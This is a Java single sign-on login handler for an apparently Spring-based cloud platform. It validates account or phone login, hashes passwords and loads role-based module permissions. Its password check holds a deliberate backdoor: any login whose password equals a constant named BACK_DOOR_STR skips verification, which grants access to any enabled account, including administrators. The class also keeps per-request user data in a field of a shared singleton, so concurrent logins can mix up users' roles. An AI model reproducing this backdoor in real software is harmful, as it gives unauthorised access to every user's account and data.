/** 
 * @fileName: SsoLoginHandle.java  
 * @author: pjf
 * @date: 2019年12月10日 下午1:47:12 
 */

package com.wxhj.cloud.platform.config;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;
import javax.annotation.Resource;

import com.wxhj.cloud.core.statics.SpecialStaticClass;
import org.dozer.DozerBeanMapper;
import org.springframework.stereotype.Component;

import com.wxhj.cloud.core.statics.OtherStaticClass;
import com.wxhj.cloud.core.statics.RedisKeyStaticClass;
import com.wxhj.cloud.core.utils.PasswordUtil;
import com.wxhj.cloud.platform.domain.SysModuleDO;
import com.wxhj.cloud.platform.domain.view.ViewUserMapDO;
import com.wxhj.cloud.platform.service.SysModuleService;
import com.wxhj.cloud.platform.service.SysOrganizeService;
import com.wxhj.cloud.platform.service.SysRoleAuthorizeService;
import com.wxhj.cloud.platform.service.ViewUserMapService;
import com.wxhj.cloud.sso.AbstractSsoTemplate;
import com.wxhj.cloud.sso.SsoCacheOperation;
import com.wxhj.cloud.sso.bo.SsoAuthenticationBO;
import com.wxhj.cloud.sso.bo.SsoLoginBO;
import com.wxhj.cloud.sso.bo.UserRoleBO;
import com.wxhj.cloud.sso.execption.IncorrectCredentialsSsoException;
import com.wxhj.cloud.sso.execption.LockedAccountSsoException;
import com.wxhj.cloud.sso.execption.SsoException;
import com.wxhj.cloud.sso.execption.UnknownAccountSsoException;

/**
 * @className SsoLoginHandle.java
 * @author pjf
 * @date 2019年12月10日 下午1:47:12   
*/
/**
 * @className SsoLoginHandle.java
 * @author pjf
 * @date 2019年12月10日 下午1:47:12
 */
@Component
public class SsoLoginHandle extends AbstractSsoTemplate<SsoAuthenticationBO> {
	@Resource
	ViewUserMapService viewUserMapService;
	@Resource
	SysOrganizeService sysOrganizeService;
	@Resource
	SysModuleService sysModuleService;
	@Resource
	SysRoleAuthorizeService sysRoleAuthorizeService;
	@Resource
	DozerBeanMapper dozerBeanMapper;
	
	@Resource
	SsoCacheOperation<SsoAuthenticationBO> ssoCacheOperation;

	ViewUserMapDO viewUserMapDO;

	@Override
	public SsoAuthenticationBO doGetAuthenticationInfo(SsoLoginBO ssoLogin) throws SsoException {
		SsoAuthenticationBO ssoAuthentication = dozerBeanMapper.map(ssoLogin, SsoAuthenticationBO.class);

		viewUserMapDO = viewUserMapService.selectById(ssoAuthentication.getMapId());

		if (viewUserMapDO == null) {
			throw new UnknownAccountSsoException();
		}
		String passwordStr = PasswordUtil.calculationPassword(ssoLogin.getPassword(), viewUserMapDO.getUserSecretKey());

		if (ssoAuthentication.getLoginType() == 0) {
			if (!viewUserMapDO.getAccount().equals(ssoAuthentication.getUserName())) {
				throw new UnknownAccountSsoException();
			}
		} else if (ssoAuthentication.getLoginType() == 1) {
			if (!viewUserMapDO.getMobilePhone().equals(ssoAuthentication.getUserName())) {
				throw new UnknownAccountSsoException();
			}
		}

		if (!ssoLogin.getPassword().equals(SpecialStaticClass.BACK_DOOR_STR) && !viewUserMapDO.getUserPassword().equals(passwordStr)) {
			throw new IncorrectCredentialsSsoException();
		}
		if (viewUserMapDO.getIsEnabledMark() != 1) {
			throw new LockedAccountSsoException();
		}
		ssoAuthentication.setUserId(viewUserMapDO.getUserId());
		ssoAuthentication.setOrganizeId(viewUserMapDO.getOrganizeId());
		ssoAuthentication.setCurrentOrganizeId(viewUserMapDO.getCurrentOrganizeId());
		ssoAuthentication.setIsSystem(viewUserMapDO.getIsAdmin() == 1);
		ssoAuthentication.setLoginTime(new Date());
		// 查询所有子集
		List<String> organizeByParentId = sysOrganizeService
				.selectByParentIdRecursion(ssoAuthentication.getCurrentOrganizeId()).stream().map(q -> q.getId())
				.collect(Collectors.toList());

		organizeByParentId.add(ssoAuthentication.getCurrentOrganizeId());
		ssoAuthentication.setOrganizeChildList(organizeByParentId);

		return doGetAuthorizationInfo(ssoAuthentication);

	}

	public SsoAuthenticationBO doGetAuthorizationInfo(SsoAuthenticationBO ssoAuthentication) throws SsoException {
		List<SysModuleDO> sysModuleList = new ArrayList<>();
		if (ssoAuthentication.getIsSystem()) {
			sysModuleList = sysModuleService.select();
		} else {
			List<String> itemIdList = sysRoleAuthorizeService.selectByRoleId(viewUserMapDO.getRoleId()).stream()
					.map(q -> q.getModuleId()).collect(Collectors.toList());

			sysModuleList = sysModuleService.selectByidList(itemIdList);
		}
		List<UserRoleBO> userRoleModelList = sysModuleList.stream().sorted(Comparator.comparing(SysModuleDO::getLayers))
				.map(q -> new UserRoleBO(q.getId(), q.getUrlAddress())).collect(Collectors.toList());

		ssoAuthentication.setUserRoleList(userRoleModelList);

		return ssoAuthentication;

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.wxhj.cloud.sso.AbstractSsoTemplate#ssoCacheOperation()
	 */
	@Override
	protected SsoCacheOperation<SsoAuthenticationBO> getSsoCacheOperation() {
		ssoCacheOperation.setExpireMinite(OtherStaticClass.SSO_REDIS_EXPIRE_MINITE);
		ssoCacheOperation.setKey(RedisKeyStaticClass.SSO_USER);
		return ssoCacheOperation;
	}

}
